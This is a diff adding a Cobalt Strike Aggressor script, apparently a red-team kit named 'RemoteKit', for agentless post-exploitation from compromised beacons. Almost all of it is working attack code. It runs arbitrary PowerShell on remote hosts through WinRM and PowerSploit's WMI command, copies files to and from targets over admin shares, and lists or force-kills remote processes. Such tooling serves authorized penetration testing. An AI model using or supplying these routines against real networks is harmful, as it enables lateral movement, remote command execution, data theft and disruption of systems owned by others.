@@ -1,0 +1,121 @@
+# Actions in this kit center interacting with remote hosts in an agentless fashion
+# @Und3rf10w
+#
+# Credit goes to Raphael Mudge for the idea, I just made a kit around it. For more info, please see:
+# http://blog.cobaltstrike.com/2016/11/03/agentless-post-exploitation/
+#
+# This is just a start, there's tons more I'd like to add. This kit currently does not
+# do anything as far as token management, so it assumes you have a valid token for the remote target.
+
+
+sub GetTargetName{
+	prompt_text("Please provide hostname or IP of target", "localhost", { $targetName = $1; });
+	return $targetName;
+}
+
+sub GetFilePath{
+	prompt_text("Path to store the file?", "C:\\Windows\\System32\\calc.exe", { $filePath = $1; });
+	return $filePath;
+}
+
+popup beacon_bottom {
+	menu "RemoteKit" {
+		menu "Command Exec" {
+			menu "Non-blind"{
+				item "WinRM"{
+					local('$bid');
+					foreach $bid ($1){
+						$beaconid = $1;
+						prompt_text("(Powershell) Command to execute", "dir", {
+							GetTargetName();
+							binput($beaconid, "Invoke-Command -Computername \" $+ $targetName $+ \" -ScriptBlock { $1 }");
+							bpowershell($beaconid, "Invoke-Command -Computername \" $+ $targetName $+ \" -ScriptBlock { $1 }");
+						});
+					}
+				}
+				item "WMI (PowerSploit)"{
+					local('$bid');
+					foreach $bid ($1){
+						$beaconid = $1;
+						bpowershell_import($beaconid, script_resource("RemoteKit/scripts/Invoke-WmiCommand"));
+						prompt_text("(Powershell) Command to execute", "dir", {
+							GetTargetName();
+							binput($beaconid, "Invoke-WmiCommand -ComputerName \" $+ $targetName $+ \" -Payload { $1 } | select -exp \"PayloadOutput\"");
+							bpowershell($beaconid, "Invoke-WmiCommand -ComputerName \" $+ $targetName $+ \" -Payload { $1 } | select -exp \"PayloadOutput\"");
+						});
+					}
+				}
+			}
+		}
+		menu "File Manipulation"{
+			# TODO: This one probably won't work honestly, not sure if I'm
+			# parsing the variables correctly
+			item "Download a file to this beacon"{
+				local('$bid');
+				foreach $bid ($1){
+					$beaconid = $1;
+					prompt_text("Path to file on target?", "C:\\Windows\\System32\\calc.exe", {
+						GetTargetName();
+						GetFilePath();
+						binput($beaconid, "shell copy \" $+ \\\\ $+ $targetName $+ $1 $+ \" \" $+ $filePath $+ \" ");
+						bshell($beaconid, "copy \" $+ \\\\ $+ $targetName $+ $1 $+ \" \" $+ $filePath $+ \" ");
+					});
+				}
+			}
+			item "Upload a file from beacon to target"{
+				local('$bid');
+				foreach $bid ($1){
+					$beaconid = $1;
+					prompt_text("Path to remotely upload file", "C:\\Windows\\System32\\calc.exe", {
+						GetTargetName();
+						GetFilePath();
+						binput($beaconid, "shell copy \" $+ $filePath $+ \" \" $+ \\\\ $+ $targetName $+ $1 $+ \" ");
+						bshell($beaconid, "copy \" $+ $filePath $+ \" \" $+ \\\\ $+ $targetName $+ $1 $+ \" ");
+					});
+				}
+			}
+		}
+		menu "Process Manipulation"{
+			item "List Running Processes (tasklist)"{
+				local('$bid');
+				foreach $bid ($1){
+					$beaconid = $1;
+					GetTargetName();
+					binput($beaconid, "shell tasklist /v /S $targetName ");
+					bshell($beaconid, "tasklist /v /S $targetName ");
+				}
+			}
+			item "List Running Processes (WMI)"{
+				local('$bid');
+				foreach $bid ($1){
+					$beaconid = $1;
+					GetTargetName();
+					binput($beaconid, "shell wmic /node:\" $+ $targetName $+ \" process list brief");
+					bshell($beaconid, "wmic /node:\" $+ $targetName $+ \" process list brief");
+				}
+			}
+			item "Kill remote process (taskkill)"{
+				local('$bid');
+				foreach $bid ($1){
+					$beaconid = $1;
+					prompt_text("PID to kill", "1337", {
+						GetTargetName();
+						binput($beaconid, "shell taskkill /S $targetName /PID $1 /F");
+						bshell($beaconid, "taskkill /S $targetName /PID $1 /F");
+					});
+				}
+			}
+			item "Kill remote process (WMI)"{
+				local('$bid');
+				foreach $bid ($1){
+					$beaconid = $1;
+					prompt_text("PID to kill", "1337", {
+						GetTargetName();
+						binput($beaconid, "shell wmic /node:\" $+ $targetName $+ \" where (ProcessID = $1 $+ ) call terminate");
+						bshell($beaconid, "wmic /node:\" $+ $targetName $+ \" where (ProcessID = $1 $+ ) call terminate");
+					});
+				}
+			}
+		}
+	}
+}
